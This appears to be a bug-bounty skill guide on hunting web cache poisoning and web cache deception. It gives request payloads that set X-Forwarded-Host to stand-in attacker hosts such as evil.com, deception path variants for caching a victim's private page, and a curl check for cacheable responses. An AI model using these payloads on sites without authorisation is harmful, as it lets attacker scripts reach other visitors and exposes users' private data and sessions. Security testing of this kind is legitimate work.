---
name: hunt-cache-poisoning
description: "Hunt web cache poisoning and cache deception. Cache poisoning: unkeyed inputs (X-Forwarded-Host, X-Original-URL, custom headers) influence response, response gets cached, victim served poisoned page. Probe: Burp Param Miner extension finds cache-key vs response-body discrepancies. Common payloads: X-Forwarded-Host: attacker.com (poisons script src URLs), X-Forwarded-Scheme: nothing (forces broken redirect), X-Host: attacker.com, query parameter cache-buster + payload. Cache deception: GET /account/profile.css (browser caches fake CSS that's actually rendered profile, attacker fetches it). Targets: CDN-fronted sites, anything with Cache-Control: public + Vary keying gaps. Validate: persistent poisoning (next visitor gets poisoned response without your input), exfil (CSS deception captures session), open redirect chained with cached response. Use when hunting CDN-fronted apps, when X-Forwarded-* headers reflect, when cache HIT/MISS visible in headers."
---

## 18. CACHE POISONING / WEB CACHE DECEPTION

### Cache Poisoning
```bash
# Unkeyed header injection
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com
# If "evil.com" reflected in response body AND gets cached → all users get poisoned page

# Param Miner (Burp extension) — finds unkeyed headers automatically
Right-click → Extensions → Param Miner → Guess headers
```

### Web Cache Deception
```bash
# Trick cache into storing victim's private response
# Victim visits: https://target.com/account/settings/nonexistent.css
# Cache sees .css → caches the private response
# Attacker requests same URL → gets victim's data

# Variants:
/account/settings%2F..%2Fstatic.css
/account/settings;.css
/account/settings/.css
```

### Detection
```bash
curl -s -I https://target.com/account | grep -i "cache-control\|x-cache\|age"
# If: no Cache-Control: private + x-cache: HIT → cacheable private data
```


